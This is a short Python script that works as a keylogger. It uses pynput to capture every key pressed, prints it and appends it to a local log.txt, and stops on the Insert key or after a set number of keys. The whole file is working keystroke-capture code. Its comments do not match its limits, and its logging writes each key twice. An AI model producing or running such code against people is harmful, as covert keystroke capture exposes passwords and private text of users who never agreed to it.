import pynput

from pynput.keyboard import Key, Listener
from pynput.keyboard import Key, Controller

# delay
keyboard = Controller()
count = 0
keys = []
endprog = False
# This should limit it to a maximum of 50 keyboard entries
trials = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]

# The following twoPIP  def functions are used to track keyboard events such as presses.


def onpress(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    for i in trials:
        if count / 10 == i:
            write_file(keys)
            keys = []  # resets keys
            # print(count)  # troubleshooting count
            # print(count / 10) ^
        # Also checks for Trials modulus, ends program if true.
        elif count / 10 == 15.0:
            return False


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", " ")
            if k.find("space") > 0:  # New line if space
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
                f.write("\n")
            f.write(str(key))
            f.write('\n')


def onrelease(key):
    if key == Key.insert or count / 10 == 10.0:
        return False


with Listener(on_press=onpress, on_release=onrelease) as listener:
    listener.join()
